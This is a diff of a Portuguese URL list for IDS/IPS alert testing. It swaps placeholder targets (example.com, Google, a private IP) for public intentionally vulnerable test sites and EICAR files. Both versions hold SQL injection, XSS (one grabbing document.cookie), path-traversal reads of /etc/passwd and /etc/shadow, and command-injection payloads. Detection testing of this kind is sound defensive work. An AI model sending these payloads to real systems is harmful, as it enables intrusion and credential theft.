@@ -1,27 +1,35 @@
-# Lista de URLs para Simulação de Monitoramento (Wazuh/IDS/IPS)
-# Estas URLs simulam padrões de ataque comuns para disparar alertas
+# Lista de URLs Reais para Simulação de Monitoramento (Suricata IDS/IPS)
+# Estes domínios são mantidos por empresas de segurança (Acunetix, IBM, Eicar) 
+# especificamente para testes legítimos de firewalls e scanners.
 
-# 1. Teste de Resposta IDS (GPL ATTACK_RESPONSE - Padrão 'uid=0(root)')
+# --- 1. Testes de Assinatura IDS (Emerging Threats) ---
+# Projetado para disparar o alerta clássico 'GPL ATTACK_RESPONSE id check returned root'
 http://testmynids.org/uid/index.html
 
-# 2. Simulação de LFI (Local File Inclusion) - Tentativa de ler /etc/passwd
-http://www.google.com/?file=../../../../etc/passwd
-http://10.10.2.253/index.php?page=../../etc/shadow
+# --- 2. SQL Injection (SQLi) ---
+# payloads enviados a sites de teste da Acunetix e IBM
+http://testphp.vulnweb.com/listproducts.php?cat=1%27%20OR%20%271%27=%271
+http://testphp.vulnweb.com/artists.php?artist=1%20UNION%20SELECT%201,2,3--
+http://demo.testfire.net/search.aspx?txtSearch=1%27%20OR%201=1--
 
-# 3. Simulação de SQL Injection (Tentativa de quebra de query)
-http://www.bing.com/search?q=1' OR '1'='1
-http://example.com/login?user=admin'--
+# --- 3. Cross-Site Scripting (XSS) ---
+http://testphp.vulnweb.com/search.php?test=%3Cscript%3Ealert('Suricata_Test')%3C/script%3E
+http://demo.testfire.net/login.aspx?pass=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
 
-# 4. Simulação de XSS (Cross-Site Scripting)
-http://example.com/search?q=<script>alert('XSS_Test')</script>
+# --- 4. Local File Inclusion (LFI) & Path Traversal ---
+http://testphp.vulnweb.com/showimage.php?file=../../../../etc/passwd
+http://demo.testfire.net/default.aspx?content=../../../../windows/win.ini
 
-# 5. Simulação de Execução de Comandos (RCE)
-http://example.com/api?cmd=cat%20/etc/passwd
-http://example.com/status?host=8.8.8.8;ls%20-la
+# --- 5. Execução de Comandos (Command Injection / RCE) ---
+http://testphp.vulnweb.com/hpp/?pp=cat%20/etc/passwd
+http://demo.testfire.net/bank/login.aspx?cmd=whoami
 
-# 6. Teste EICAR (Simulação de Download de Malware - Somente se houver Proxy/SSL Inspection)
+# --- 6. Scanners de Vulnerabilidade (Padrões de Dicionário) ---
+http://testphp.vulnweb.com/.git/config
+http://testphp.vulnweb.com/phpmyadmin/
+http://demo.testfire.net/admin/
+
+# --- 7. Teste de Malware (EICAR) ---
+# Padrão da indústria para testar gateways antivírus e IPS
 https://secure.eicar.org/eicar.com.txt
-
-# 7. Domínios comumente usados para testes de Phishing/Malware (Safe Test)
-http://www.vicar.com
-http://www.amtso.org/check-desktop-compressed-malware-download/
+http://www.eicar.org/download/eicar.com.txt
